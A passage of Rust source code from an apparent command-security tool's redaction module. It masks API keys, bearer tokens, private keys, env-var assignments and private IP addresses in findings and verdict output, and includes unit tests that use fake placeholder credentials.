    // 2. Credential patterns — ahead of built-ins so a built-in's labeled
    //    output doesn't shadow a credential match.
    // `Authorization: Bearer` values are sensitive by protocol, so they are
    // redacted here as well as in `redact()` — the narrow provider patterns
    // below do not recognize JWT or opaque bearer alphabets.
    let bearer_matches = AUTHORIZATION_BEARER_PATTERN.find_iter(&result).count();
    if bearer_matches > 0 {
        result = AUTHORIZATION_BEARER_PATTERN
            .replace_all(&result, |captures: &regex::Captures| {
                format!("{}[REDACTED:Bearer Token]", &captures[1])
            })
            .into_owned();
        bump("bearer_token", bearer_matches, &mut counts, &mut order);
    }

    for entry in CREDENTIAL_REDACT_PATTERNS.iter() {
        let matches = entry.regex.find_iter(&result).count();
        if matches > 0 {
            let prefix_len = entry.prefix_len;
            result = entry
                .regex
                .replace_all(&result, |caps: &regex::Captures| {
                    let matched = &caps[0];
                    let prefix: String = matched.chars().take(prefix_len).collect();
                    format!("{prefix}[REDACTED]")
                })
                .into_owned();
            bump(&entry.label, matches, &mut counts, &mut order);
        }
    }

    // 3. Built-in patterns (every audience) — long-tail providers not in
    //    credential_patterns.toml.
    for (idx, (label, regex)) in BUILTIN_PATTERNS.iter().enumerate() {
        let matches = regex.find_iter(&result).count();
        if matches > 0 {
            result = regex
                .replace_all(&result, format!("[REDACTED:{label}]"))
                .into_owned();
            bump(builtin_label_for(idx), matches, &mut counts, &mut order);
        }
    }

    // Preserve the stable report ordering from the prior implementation even
    // though the one-pass customer replacement itself must run on original
    // input before any generated marker exists.
    bump("customer_id", customer_id_matches, &mut counts, &mut order);

    // 4. Share patterns (audience-filtered).
    let token = audience.toml_token();
    for entry in SHARE_PATTERNS.iter() {
        if !entry.audiences.iter().any(|a| a == token) {
            continue;
        }
        let matches = entry.regex.find_iter(&result).count();
        if matches > 0 {
            let label = entry.label.clone();
            result = entry
                .regex
                .replace_all(&result, format!("[REDACTED:{label}]").as_str())
                .into_owned();
            bump(&entry.label, matches, &mut counts, &mut order);
        }
    }

    // 5. Private-IPv4 redaction (public-paste only) — see `apply_private_ipv4`.
    if matches!(audience, ShareAudience::PublicPaste) {
        let (new_result, n) = apply_private_ipv4(&result);
        result = new_result;
        bump("private_ipv4", n, &mut counts, &mut order);
    }

    let redactions = order
        .into_iter()
        .map(|label| RedactionCount {
            count: counts[&label],
            label,
        })
        .collect();

    Ok(RedactReport {
        redacted_content: result,
        redactions,
    })
}

/// Redact RFC1918 private IPv4 in hostname context. Returns `(new, n)`.
///
/// Narrow to avoid false positives: the IP must match an RFC1918 range AND
/// either (1) be preceded by `server`/`host`/`hostname`/`connect`/`at` within 20
/// chars, OR (2) be on its own line. Public IPs (`1.1.1.1`, `8.8.8.8`) are NOT
/// touched; even a private IP is left alone without a context signal (readmes
/// reference private CIDRs as examples).
fn apply_private_ipv4(input: &str) -> (String, usize) {
    static IP_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(concat!(
            r"\b(",
            r"10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}",
            r"|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}",
            r"|192\.168\.[0-9]{1,3}\.[0-9]{1,3}",
            r")\b",
        ))
        .unwrap()
    });

    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut cursor = 0usize;
    let mut count = 0usize;

    for cap in IP_RE.find_iter(input) {
        let start = cap.start();
        let end = cap.end();

        // Up-to-20-byte preceding window for the keyword check. Snap forward to
        // a char boundary — slicing inside a multibyte UTF-8 sequence panics
        // (regression: multibyte chars before the IP).
        let mut window_start = start.saturating_sub(20);
        while window_start < start && !input.is_char_boundary(window_start) {
            window_start += 1;
        }
        let preceding = &input[window_start..start];

        // Either trigger suffices.
        let keyword_context = has_trailing_context_keyword(preceding);
        let own_line = is_on_own_line(bytes, start, end);

        if !(keyword_context || own_line) {
            continue;
        }

        out.push_str(&input[cursor..start]);
        out.push_str("[REDACTED:private_ipv4]");
        cursor = end;
        count += 1;
    }
    out.push_str(&input[cursor..]);

    (out, count)
}

/// True when `preceding` ends with a hostname-context keyword + whitespace.
fn has_trailing_context_keyword(preceding: &str) -> bool {
    static KW_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?i)\b(server|host|hostname|connect|at)\s+$").unwrap());
    KW_RE.is_match(preceding)
}

/// True when `[start..end)` is the only non-whitespace content on its line.
fn is_on_own_line(bytes: &[u8], start: usize, end: usize) -> bool {
    // Walk back to line start; require only whitespace.
    let mut i = start;
    while i > 0 {
        let b = bytes[i - 1];
        if b == b'\n' {
            break;
        }
        if !(b == b' ' || b == b'\t') {
            return false;
        }
        i -= 1;
    }
    // Walk forward; require only whitespace until EOL/EOF.
    let mut j = end;
    while j < bytes.len() {
        let b = bytes[j];
        if b == b'\n' {
            return true;
        }
        if !(b == b' ' || b == b'\t' || b == b'\r') {
            return false;
        }
        j += 1;
    }
    true
}

/// Redact shell-style assignment values such as `KEY=value` before user content
/// is serialized into logs or JSON output.
pub fn redact_shell_assignments(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;

    while i < chars.len() {
        if let Some((prefix, next)) = redact_powershell_env_assignment(&chars, i) {
            out.push_str(&prefix);
            out.push_str("[REDACTED]");
            i = next;
            continue;
        }

        if is_assignment_start(&chars, i) {
            let name_start = i;
            i += 1;
            while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
                i += 1;
            }
            if i < chars.len() && chars[i] == '=' {
                let name: String = chars[name_start..i].iter().collect();
                out.push_str(&name);
                out.push_str("=[REDACTED]");
                i += 1;
                i = skip_assignment_value(&chars, i);
                continue;
            }
            out.push(chars[name_start]);
            i = name_start + 1;
            continue;
        }

        out.push(chars[i]);
        i += 1;
    }

    out
}

/// Redact a command-like string for public output by scrubbing assignment values
/// first, then applying built-in and custom DLP patterns.
pub fn redact_command_text(input: &str, custom_patterns: &[String]) -> String {
    let compiled = CompiledCustomPatterns::new(custom_patterns);
    redact_command_text_with_compiled(input, &compiled)
}

/// Redact a command-like string with one already-compiled custom-DLP plan.
/// Output surfaces which project several sibling fields use this entry point so
/// every field is governed by the same frozen plan without regex recompilation.
pub fn redact_command_text_with_compiled(input: &str, compiled: &CompiledCustomPatterns) -> String {
    // Private-key structure must be removed before assignment scrubbing. An
    // input such as `KEY=-----BEGIN RSA PRIVATE KEY-----\n...` otherwise has
    // its BEGIN marker split by the assignment pass, leaving the key body for
    // the later generic redactor to miss.
    let (private_safe, _) = redact_private_key_blocks(input);
    let scrubbed = redact_shell_assignments(&private_safe);
    redact_with_compiled(&scrubbed, compiled)
}

/// Return a redacted clone of the provided findings for public-facing output.
pub fn redacted_findings(
    findings: &[crate::verdict::Finding],
    custom_patterns: &[String],
) -> Vec<crate::verdict::Finding> {
    let mut redacted = findings.to_vec();
    redact_findings(&mut redacted, custom_patterns);
    redacted
}

/// Redact sensitive content from a Finding's string fields in-place.
pub fn redact_finding(finding: &mut crate::verdict::Finding, custom_patterns: &[String]) {
    let compiled = CompiledCustomPatterns::new(custom_patterns);
    redact_finding_with_compiled(finding, &compiled);
}

fn redact_finding_with_compiled(
    finding: &mut crate::verdict::Finding,
    compiled: &CompiledCustomPatterns,
) {
    finding.title = redact_sanitize_redact_with_compiled(&finding.title, compiled);
    finding.description = redact_sanitize_redact_with_compiled(&finding.description, compiled);
    redact_optional_string(&mut finding.mitre_id, compiled);
    redact_optional_string(&mut finding.custom_rule_id, compiled);
    if let Some(ref mut v) = finding.human_view {
        *v = redact_sanitize_redact_with_compiled(v, compiled);
    }
    if let Some(ref mut v) = finding.agent_view {
        *v = redact_sanitize_redact_with_compiled(v, compiled);
    }
    for ev in &mut finding.evidence {
        redact_evidence(ev, compiled);
    }
}

fn redact_evidence(ev: &mut crate::verdict::Evidence, compiled: &CompiledCustomPatterns) {
    use crate::verdict::Evidence;
    match ev {
        Evidence::Url { raw } => {
            *raw = redact_sanitize_redact_with_compiled(raw, compiled);
        }
        Evidence::HostComparison {
            raw_host,
            similar_to,
        } => {
            *raw_host = redact_sanitize_redact_with_compiled(raw_host, compiled);
            *similar_to = redact_sanitize_redact_with_compiled(similar_to, compiled);
        }
        Evidence::CommandPattern { pattern, matched } => {
            *pattern = redact_sanitize_redact_with_compiled(pattern, compiled);
            *matched = redact_sanitize_redact_command_with_compiled(matched, compiled);
        }
        Evidence::ByteSequence {
            offset: _,
            hex,
            description,
        } => {
            *hex = redact_sanitize_redact_with_compiled(hex, compiled);
            *description = redact_sanitize_redact_with_compiled(description, compiled);
        }
        Evidence::EnvVar {
            name,
            value_preview,
        } => {
            *name = redact_sanitize_redact_with_compiled(name, compiled);
            *value_preview = redact_sanitize_redact_with_compiled(value_preview, compiled);
        }
        Evidence::Text { detail } => {
            *detail = redact_sanitize_redact_command_with_compiled(detail, compiled);
        }
        Evidence::ThreatIntel {
            source,
            threat_type,
            confidence: _,
            reference,
        } => {
            *source = redact_sanitize_redact_with_compiled(source, compiled);
            *threat_type = redact_sanitize_redact_with_compiled(threat_type, compiled);
            if let Some(reference) = reference {
                *reference = redact_sanitize_redact_with_compiled(reference, compiled);
            }
        }
        Evidence::HomoglyphAnalysis {
            raw,
            escaped,
            suspicious_chars,
        } => {
            *raw = redact_sanitize_redact_with_compiled(raw, compiled);
            *escaped = redact_sanitize_redact_with_compiled(escaped, compiled);
            for suspicious in suspicious_chars {
                let character = suspicious.character.to_string();
                if redact_sanitize_redact_with_compiled(&character, compiled) != character {
                    // `character` serializes as a one-character string. It
                    // cannot hold a multi-character secret, but a one-character
                    // custom DLP rule must still not leak through this field.
                    suspicious.character = '\u{FFFD}';
                }
                suspicious.codepoint =
                    redact_sanitize_redact_with_compiled(&suspicious.codepoint, compiled);
                suspicious.description =
                    redact_sanitize_redact_with_compiled(&suspicious.description, compiled);
                suspicious.hex_bytes =
                    redact_sanitize_redact_with_compiled(&suspicious.hex_bytes, compiled);
            }
        }
    }
}

/// Redact all findings in a verdict in-place.
pub fn redact_verdict(verdict: &mut crate::verdict::Verdict, custom_patterns: &[String]) {
    let compiled = CompiledCustomPatterns::new(custom_patterns);
    redact_verdict_with_compiled(verdict, &compiled);
}

/// Redact a verdict with a caller-owned compiled DLP plan.
pub fn redact_verdict_with_compiled(
    verdict: &mut crate::verdict::Verdict,
    compiled: &CompiledCustomPatterns,
) {
    redact_findings_with_compiled(&mut verdict.findings, compiled);
    redact_optional_string(&mut verdict.policy_path_used, compiled);
    redact_optional_string(&mut verdict.approval_fallback, compiled);
    redact_optional_string(&mut verdict.approval_rule, compiled);
    redact_optional_string(&mut verdict.approval_description, compiled);
    redact_optional_string(&mut verdict.escalation_reason, compiled);
    redact_optional_string(&mut verdict.manifest_allowed_match, compiled);
    if let Some(origin) = verdict.agent_origin.as_mut() {
        match origin {
            crate::agent_origin::AgentOrigin::Human { .. }
            | crate::agent_origin::AgentOrigin::Gateway => {}
            crate::agent_origin::AgentOrigin::Agent { tool, version } => {
                *tool = redact_sanitize_redact_with_compiled(tool, compiled);
                redact_optional_string(version, compiled);
            }
            crate::agent_origin::AgentOrigin::Mcp {
                client_name,
                client_version,
            } => {
                *client_name = redact_sanitize_redact_with_compiled(client_name, compiled);
                redact_optional_string(client_version, compiled);
            }
            crate::agent_origin::AgentOrigin::Ci { provider } => {
                redact_optional_string(provider, compiled)
            }
            crate::agent_origin::AgentOrigin::Ide { name } => {
                *name = redact_sanitize_redact_with_compiled(name, compiled)
            }
        }
    }
}

fn redact_optional_string(value: &mut Option<String>, compiled: &CompiledCustomPatterns) {
    if let Some(value) = value {
        *value = redact_sanitize_redact_with_compiled(value, compiled);
    }
}

/// Redact all findings in a slice in-place.
pub fn redact_findings(findings: &mut [crate::verdict::Finding], custom_patterns: &[String]) {
    let compiled = CompiledCustomPatterns::new(custom_patterns);
    redact_findings_with_compiled(findings, &compiled);
}

/// Redact findings with a caller-owned compiled DLP plan.
pub fn redact_findings_with_compiled(
    findings: &mut [crate::verdict::Finding],
    compiled: &CompiledCustomPatterns,
) {
    for f in findings.iter_mut() {
        redact_finding_with_compiled(f, compiled);
    }
}

/// Recursively apply redact-sanitize-redact to every string value in a
/// machine-readable projection while preserving keys, schema, booleans, and
/// numeric decision metadata. Call this before any presentation bound.
pub fn redact_json_strings(value: &mut serde_json::Value, compiled: &CompiledCustomPatterns) {
    match value {
        serde_json::Value::String(text) => {
            *text = redact_sanitize_redact_with_compiled(text, compiled)
        }
        serde_json::Value::Array(items) => {
            for item in items {
                redact_json_strings(item, compiled);
            }
        }
        serde_json::Value::Object(object) => {
            for value in object.values_mut() {
                redact_json_strings(value, compiled);
            }
        }
        _ => {}
    }
}

fn is_assignment_boundary(prev: char) -> bool {
    prev.is_ascii_whitespace() || matches!(prev, ';' | '|' | '&' | '(' | '\n')
}

fn is_assignment_start(chars: &[char], idx: usize) -> bool {
    let ch = chars[idx];
    if !(ch.is_ascii_alphabetic() || ch == '_') {
        return false;
    }
    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
        return false;
    }
    true
}

fn skip_assignment_value(chars: &[char], mut idx: usize) -> usize {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while idx < chars.len() {
        let ch = chars[idx];
        if escaped {
            escaped = false;
            idx += 1;
            continue;
        }
        if !in_single && ch == '\\' {
            escaped = true;
            idx += 1;
            continue;
        }
        if !in_double && ch == '\'' {
            in_single = !in_single;
            idx += 1;
            continue;
        }
        if !in_single && ch == '"' {
            in_double = !in_double;
            idx += 1;
            continue;
        }
        if !in_single
            && !in_double
            && (ch.is_ascii_whitespace() || matches!(ch, ';' | '|' | '&' | '\n'))
        {
            break;
        }
        idx += 1;
    }

    idx
}

fn redact_powershell_env_assignment(chars: &[char], idx: usize) -> Option<(String, usize)> {
    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
        return None;
    }
    if chars.get(idx) != Some(&'$') {
        return None;
    }
    let prefix = ['e', 'n', 'v', ':'];
    for (offset, expected) in prefix.iter().enumerate() {
        let ch = chars.get(idx + 1 + offset)?;
        if !ch.eq_ignore_ascii_case(expected) {
            return None;
        }
    }

    let name_start = idx + 5;
    let first = *chars.get(name_start)?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }

    let mut i = name_start + 1;
    while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
        i += 1;
    }
    let mut value_start = i;
    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
        value_start += 1;
    }
    if chars.get(value_start) != Some(&'=') {
        return None;
    }
    value_start += 1;
    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
        value_start += 1;
    }

    let prefix_text: String = chars[idx..value_start].iter().collect();
    let value_end = skip_assignment_value(chars, value_start);
    Some((prefix_text, value_end))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_redact_openai_key() {
        let key = concat!("sk-", "abcdefghijklmnopqrstuvwxyz12345678");
        let input = format!("export OPENAI_API_KEY={key}");
        let redacted = redact(&input);
        assert!(!redacted.contains("sk-abcdef"));
        assert!(redacted.contains("[REDACTED:OpenAI API Key]"));
    }

    #[test]
    fn test_redact_aws_key() {
        let input = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
        let redacted = redact(input);
        assert!(!redacted.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(redacted.contains("[REDACTED:AWS Access Key]"));
    }

    #[test]
    fn test_redact_sendgrid_segmented_key() {
        let key = format!("SG.{}.{}", "A".repeat(22), "b".repeat(43));
        let redacted = redact(&format!("SENDGRID_API_KEY={key}"));
        assert!(!redacted.contains(&key));
        assert!(redacted.contains("SG.[REDACTED]"));
    }

    #[test]
    fn test_redact_private_keys_with_or_without_footer() {
        let complete = concat!(
            "-----BEGIN OPENSSH PRIVATE KEY-----\n",
            "b3BlbnNzaC1rZXktdjEAAAAA\n",
            "-----END OPENSSH PRIVATE KEY-----\n",
            "after"
        );
        let complete_redacted = redact(complete);
        assert!(!complete_redacted.contains("b3BlbnNzaC1rZXktdjEAAAAA"));
        assert!(complete_redacted.ends_with("\nafter"));

        for truncated in [
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEprivatebody",
            "-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQdGprivatebody",
        ] {
            let redacted = redact(truncated);
            assert_eq!(redacted, "[REDACTED]");

            let report = redact_for_audience(truncated, ShareAudience::PublicPaste);
            assert_eq!(report.redacted_content, "[REDACTED]");
            assert_eq!(report.total(), 1);
        }

        let decoy_footer = concat!(
            "-----BEGIN RSA PRIVATE KEY-----\n",
            "FIRST-SECRET\n",
            "-----END EC PRIVATE KEY-----\n",
            "SECOND-SECRET\n",
            "-----END RSA PRIVATE KEY-----\n",
            "after"
        );
        let redacted = redact(decoy_footer);
        assert!(!redacted.contains("FIRST-SECRET"));
        assert!(!redacted.contains("SECOND-SECRET"));
        assert!(redacted.ends_with("\nafter"));
    }

    #[test]
    fn custom_patterns_cannot_hide_private_key_headers() {
        let key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEprivatebody";
        let patterns = vec!["BEGIN RSA".to_string()];
        let generic = redact_with_custom(key, &patterns);
        assert_eq!(generic, "[REDACTED]");

        let audience = redact_for_audience_with_custom(key, ShareAudience::PublicPaste, &patterns);
        assert_eq!(audience.redacted_content, "[REDACTED]");
        assert!(audience
            .redactions
            .iter()
            .any(|row| row.label == "private_key" && row.count == 1));
    }

    #[test]
    fn command_assignment_scrubbing_cannot_destroy_private_key_header() {
        let input = "KEY=-----BEGIN RSA PRIVATE KEY-----\nMIIErecoverable-private-body";
        let redacted = redact_command_text(input, &[]);
        assert!(!redacted.contains("RSA PRIVATE KEY"), "got: {redacted}");
        assert!(
            !redacted.contains("MIIErecoverable-private-body"),
            "got: {redacted}"
        );
        assert!(redacted.contains("[REDACTED]"), "got: {redacted}");
    }

    #[test]
    fn test_redact_github_pat() {
        let pat = concat!("gh", "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl");
        let input = format!("GITHUB_TOKEN={pat}");
        let redacted = redact(&input);
        assert!(!redacted.contains("ghp_ABCDEF"));
        assert!(redacted.contains("[REDACTED:GitHub PAT]"));
    }

    #[test]
    fn test_redact_email() {
        let input = "contact: user@example.com for details";
        let redacted = redact(input);
        assert!(!redacted.contains("user@example.com"));
        assert!(redacted.contains("[REDACTED:Email Address]"));
    }

    #[test]
    fn test_redact_no_false_positive() {
        let input = "normal text without any secrets";
        let redacted = redact(input);
        assert_eq!(input, redacted);
    }

    #[test]
    fn test_redact_with_custom() {
        let input = "internal ref: PROJ-12345 in the system";
        let custom = vec![r"PROJ-\d+".to_string()];
        let redacted = redact_with_custom(input, &custom);
        assert!(!redacted.contains("PROJ-12345"));
        assert!(redacted.contains("[REDACTED:custom]"));
    }

    #[test]
    fn terminal_sanitization_cannot_reconstitute_a_builtin_secret() {
        let secret = format!("ghp_{}", "A1b2C3d4".repeat(5));
        let split = format!("{}\u{1b}[31m{}", &secret[..19], &secret[19..]);
        let compiled = CompiledCustomPatterns::new_silent(&[]);

        let safe = redact_sanitize_redact_with_compiled(&split, &compiled);

        assert!(!safe.contains(&secret));
        assert!(safe.contains("[REDACTED:GitHub PAT]"), "{safe}");
        assert!(!safe.contains('\u{1b}'));
    }

    #[test]
    fn terminal_sanitization_cannot_reconstitute_a_custom_secret() {
        let secret = "C02_CUSTOM_DLP_RECONSTITUTION_CANARY";
        let split = format!("{}\u{200b}{}", &secret[..15], &secret[15..]);
        let compiled = CompiledCustomPatterns::new_silent(&[regex::escape(secret)]);

        let safe = redact_sanitize_redact_with_compiled(&split, &compiled);

        assert!(!safe.contains(secret));
        assert!(safe.contains("[REDACTED:custom]"), "{safe}");
        assert!(!safe.contains('\u{200b}'));
    }

    #[test]
    fn custom_dlp_compiler_enforces_utf8_byte_boundary() {
        let ascii_at_limit = "a".repeat(MAX_CUSTOM_DLP_PATTERN_BYTES);
        let ascii_over_limit = "a".repeat(MAX_CUSTOM_DLP_PATTERN_BYTES + 1);
        assert!(compile_custom_dlp_pattern(&ascii_at_limit).is_ok());
        assert!(matches!(
            compile_custom_dlp_pattern(&ascii_over_limit),
            Err(CustomDlpPatternError::TooLong {
                actual_bytes: 1025,
                max_bytes: MAX_CUSTOM_DLP_PATTERN_BYTES,
            })
        ));

        let multibyte_at_limit = "é".repeat(MAX_CUSTOM_DLP_PATTERN_BYTES / 2);
        let multibyte_over_limit = format!("{multibyte_at_limit}a");
        assert_eq!(multibyte_at_limit.len(), MAX_CUSTOM_DLP_PATTERN_BYTES);
        assert_eq!(multibyte_over_limit.len(), MAX_CUSTOM_DLP_PATTERN_BYTES + 1);
        assert!(compile_custom_dlp_pattern(&multibyte_at_limit).is_ok());
        assert!(matches!(
            compile_custom_dlp_pattern(&multibyte_over_limit),
            Err(CustomDlpPatternError::TooLong { .. })
        ));

        assert!(matches!(
            compile_custom_dlp_pattern("("),
            Err(CustomDlpPatternError::InvalidRegex)
        ));
    }

    #[test]
    fn every_custom_dlp_runtime_path_uses_the_shared_compiler() {
        let legitimate_pattern = r"PROJ-\d+".to_string();
        let input = "internal ref: PROJ-12345";
        assert!(
            redact_with_custom(input, std::slice::from_ref(&legitimate_pattern))
                .contains("[REDACTED:custom]")
        );

        let compiled = CompiledCustomPatterns::new(std::slice::from_ref(&legitimate_pattern));
        assert!(redact_with_compiled(input, &compiled).contains("[REDACTED:custom]"));

        let over_limit = "z".repeat(MAX_CUSTOM_DLP_PATTERN_BYTES + 1);
        assert!(matches!(
            try_redact_with_custom(&over_limit, std::slice::from_ref(&over_limit)),
            Err(RedactionIncomplete::PatternRejected {
                index: 0,
                error: CustomDlpPatternError::TooLong { .. },
            })
        ));
        assert_eq!(
            redact_with_custom(&over_limit, std::slice::from_ref(&over_limit)),
            INCOMPLETE_REDACTION_MARKER
        );
        let compiled = CompiledCustomPatterns::new(std::slice::from_ref(&over_limit));
        assert!(matches!(
            try_redact_with_compiled(&over_limit, &compiled),
            Err(RedactionIncomplete::PatternRejected {
                index: 0,
                error: CustomDlpPatternError::TooLong { .. },
            })
        ));
        assert_eq!(
            redact_with_compiled(&over_limit, &compiled),
            INCOMPLETE_REDACTION_MARKER
        );

        assert!(matches!(
            try_redact_for_audience_with_custom(
                &over_limit,
                ShareAudience::Slack,
                std::slice::from_ref(&over_limit),
            ),
            Err(RedactionIncomplete::PatternRejected {
                index: 0,
                error: CustomDlpPatternError::TooLong { .. },
            })
        ));
        let report = redact_for_audience_with_custom(
            &over_limit,
            ShareAudience::Slack,
            std::slice::from_ref(&over_limit),
        );
        assert_eq!(report.redacted_content, INCOMPLETE_REDACTION_MARKER);
        assert_eq!(report.redactions.len(), 1);
        assert_eq!(report.redactions[0].label, "redaction_incomplete");
    }

    #[test]
    fn custom_dlp_rejects_zero_width_patterns_and_fails_closed() {
        for pattern in ["", r"\b", "a*"] {
            assert!(matches!(
                compile_custom_dlp_pattern(pattern),
                Err(CustomDlpPatternError::ZeroWidthMatch)
            ));
            let patterns = vec![pattern.to_string()];
            assert!(matches!(
                try_redact_with_custom("top secret", &patterns),
                Err(RedactionIncomplete::PatternRejected {
                    index: 0,
                    error: CustomDlpPatternError::ZeroWidthMatch,
                })
            ));
            assert_eq!(
                redact_with_custom("top secret", &patterns),
                INCOMPLETE_REDACTION_MARKER
            );
        }
    }

    #[test]
    fn custom_dlp_one_pass_merges_overlaps_without_replacement_amplification() {
        let forward = vec!["A".to_string(), ".".to_string()];
        let reverse = vec![".".to_string(), "A".to_string()];

        assert_eq!(redact_with_custom("A", &forward), CUSTOM_REDACTION_MARKER);
        assert_eq!(redact_with_custom("A", &reverse), CUSTOM_REDACTION_MARKER);

        let built_in_secret = "AKIAIOSFODNN7EXAMPLE";
        let inserted_marker_pattern = vec!["REDACTED".to_string()];
        assert_eq!(
            redact_with_custom(built_in_secret, &inserted_marker_pattern),
            "[REDACTED:AWS Access Key]",
            "custom patterns must only see original input, not built-in replacement text"
        );

        let input = "前TOKEN-秘密後";
        let overlaps = vec!["TOKEN-秘密".to_string(), "秘密後".to_string()];
        let reversed = overlaps.iter().rev().cloned().collect::<Vec<_>>();
        let expected = format!("前{CUSTOM_REDACTION_MARKER}");
        assert_eq!(redact_with_custom(input, &overlaps), expected);
        assert_eq!(redact_with_custom(input, &reversed), expected);
    }

    #[test]
    fn custom_dlp_pattern_match_and_output_budgets_have_legitimate_boundaries() {
        let at_pattern_limit = vec!["never-match".to_string(); MAX_CUSTOM_DLP_PATTERNS];
        assert_eq!(
            try_redact_with_custom("legitimate café 東京", &at_pattern_limit).unwrap(),
            "legitimate café 東京"
        );
        let over_pattern_limit = vec!["never-match".to_string(); MAX_CUSTOM_DLP_PATTERNS + 1];
        assert!(matches!(
            try_redact_with_custom("secret", &over_pattern_limit),
            Err(RedactionIncomplete::PatternLimitExceeded {
                actual,
                max: MAX_CUSTOM_DLP_PATTERNS,
            }) if actual == MAX_CUSTOM_DLP_PATTERNS + 1
        ));
        assert_eq!(
            redact_with_custom("secret", &over_pattern_limit),
            INCOMPLETE_REDACTION_MARKER
        );

        let long_token = "01234567890123456789";
        let at_match_limit = long_token.repeat(MAX_CUSTOM_DLP_MATCHES);
        let one_pattern = vec![long_token.to_string()];
        let redacted = try_redact_with_custom(&at_match_limit, &one_pattern).unwrap();
        assert_eq!(
            redacted.matches(CUSTOM_REDACTION_MARKER).count(),
            MAX_CUSTOM_DLP_MATCHES
        );
        let over_match_limit = long_token.repeat(MAX_CUSTOM_DLP_MATCHES + 1);
        assert!(matches!(
            try_redact_with_custom(&over_match_limit, &one_pattern),
            Err(RedactionIncomplete::MatchLimitExceeded {
                actual_at_least,
                max: MAX_CUSTOM_DLP_MATCHES,
            }) if actual_at_least == MAX_CUSTOM_DLP_MATCHES + 1
        ));
        assert_eq!(
            redact_with_custom(&over_match_limit, &one_pattern),
            INCOMPLETE_REDACTION_MARKER
        );

        let overhead_per_match = CUSTOM_REDACTION_MARKER.len() - 1;
        assert_eq!(MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES % overhead_per_match, 0);
        let at_overhead_limit =
            "x".repeat(MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES / overhead_per_match);
        assert!(try_redact_with_custom(&at_overhead_limit, &["x".into()]).is_ok());
        let over_overhead_limit = format!("{at_overhead_limit}x");
        assert!(matches!(
            try_redact_with_custom(&over_overhead_limit, &["x".into()]),
            Err(RedactionIncomplete::OutputOverheadExceeded {
                max_bytes: MAX_CUSTOM_DLP_OUTPUT_OVERHEAD_BYTES,
                ..
            })
        ));
        assert_eq!(
            redact_with_custom(&over_overhead_limit, &["x".into()]),
            INCOMPLETE_REDACTION_MARKER
        );
    }

    #[test]
    fn test_redact_anthropic_key() {
        let key = concat!("sk-ant-api03-", "abcdefghijklmnop");
        let input = format!("ANTHROPIC_API_KEY={key}");
        let redacted = redact(&input);
        assert!(!redacted.contains("sk-ant-api03"));
        assert!(redacted.contains("[REDACTED:Anthropic API Key]"));
    }

    #[test]
    fn test_redact_finding_covers_all_fields() {
        use crate::verdict::{Evidence, Finding, RuleId, Severity};
        let openai_key = concat!("sk-", "abcdefghijklmnopqrstuvwxyz12345678");
        let github_pat = concat!("gh", "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl");
        let aws_key = "AKIAIOSFODNN7EXAMPLE";

        let mut finding = Finding {
            rule_id: RuleId::SensitiveEnvExport,
            severity: Severity::High,
            title: "test".into(),
            description: format!("exports {openai_key}"),
            evidence: vec![
                Evidence::EnvVar {
                    name: "OPENAI_API_KEY".into(),
                    value_preview: openai_key.into(),
                },
                Evidence::Text {
                    detail: format!("saw {github_pat}"),
                },
                Evidence::CommandPattern {
                    pattern: "export".into(),
                    matched: format!("export OPENAI_API_KEY={openai_key}"),
                },
            ],
            human_view: Some(format!("key is {openai_key}")),
            agent_view: Some(format!("{aws_key} exposed")),
            mitre_id: None,
            custom_rule_id: None,
        };

        redact_finding(&mut finding, &[]);

        assert!(finding.description.contains("[REDACTED:OpenAI API Key]"));
        assert!(!finding.description.contains("sk-abcdef"));

        match &finding.evidence[0] {
            Evidence::EnvVar { value_preview, .. } => {
                assert!(value_preview.contains("[REDACTED:OpenAI API Key]"));
            }
            _ => panic!("expected EnvVar"),
        }
        match &finding.evidence[1] {
            Evidence::Text { detail } => {
                assert!(detail.contains("[REDACTED:GitHub PAT]"));
            }
            _ => panic!("expected Text"),
        }
        match &finding.evidence[2] {
            Evidence::CommandPattern { matched, .. } => {
                assert!(matched.contains("OPENAI_API_KEY=[REDACTED]"));
                assert!(!matched.contains("sk-abcdef"));
            }
            _ => panic!("expected CommandPattern"),
        }

        assert!(finding
            .human_view
            .as_ref()
            .unwrap()
            .contains("[REDACTED:OpenAI API Key]"));
        assert!(finding
            .agent_view
            .as_ref()
            .unwrap()
            .contains("[REDACTED:AWS Access Key]"));
    }

    #[test]
    fn redact_finding_covers_every_string_bearing_evidence_variant() {
        use crate::threatdb::Confidence;
        use crate::verdict::{Evidence, Finding, RuleId, Severity, SuspiciousChar};

        const SENTINEL: &str = "SENTINEL_SECRET";
        let tagged = |label: &str| format!("{label}-{SENTINEL}");
        let mut finding = Finding {
            rule_id: RuleId::SensitiveEnvExport,
            severity: Severity::High,
            title: "evidence coverage".into(),
            description: "all variants".into(),
            evidence: vec![
                Evidence::Url { raw: tagged("url") },
                Evidence::HostComparison {
                    raw_host: tagged("raw-host"),
                    similar_to: tagged("similar-to"),
                },
                Evidence::CommandPattern {
                    pattern: tagged("pattern"),
                    matched: format!("TOKEN={SENTINEL}"),
                },
                Evidence::ByteSequence {
                    offset: 7,
                    hex: tagged("hex"),
